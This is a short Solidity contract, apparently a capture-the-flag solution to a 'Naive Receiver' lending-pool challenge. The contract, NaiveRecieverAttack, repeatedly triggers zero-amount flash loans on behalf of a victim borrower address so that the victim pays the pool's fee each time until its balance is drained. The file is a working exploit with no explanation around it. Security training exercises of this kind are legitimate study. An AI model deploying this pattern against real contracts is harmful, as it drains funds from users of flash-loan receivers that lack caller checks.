// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";



contract NaiveRecieverAttack{

    NaiveReceiverLenderPool pool;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;


    constructor (address payable _pool){
        pool = NaiveReceiverLenderPool(_pool);
    }

    function flashLoan(address targetAddress) external {
        for(uint i = 0; i < 10; i++){
            pool.flashLoan(
        IERC3156FlashBorrower(targetAddress), 
        ETH,
        0,
        bytes("")
    );
        }
    }


}